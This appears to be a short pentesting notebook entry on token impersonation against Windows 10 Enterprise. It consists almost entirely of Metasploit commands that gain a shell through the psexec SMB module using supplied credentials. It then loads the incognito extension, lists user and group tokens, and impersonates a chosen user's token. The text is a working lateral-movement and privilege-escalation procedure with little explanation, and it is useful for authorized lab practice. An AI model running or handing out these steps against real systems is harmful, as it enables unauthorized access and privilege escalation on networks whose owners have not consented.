# Token Impersonation with Incognito

Start Windows 10 Enterprise&#x20;

open metasploit and search "psexec"

then "use exploit/windows/smb/psexec"&#x20;

enter "options:&#x20;

"set RHOST USER\_IP"

set SMBUSER USERNAME"

set SMBPASS PASSWORD

set SMBDOMAIN DOMAIN\_NAME

run



if attack is success then&#x20;

shell

whoami

ctrl + c&#x20;

load incongnito

list\_tokens -u                         \[will get list of users]&#x20;

list\_tokens -g                         \[will get list of groups]&#x20;

impersonate\_token USERNAME         \[Here username will be same as got in above command]&#x20;

shell

whoami











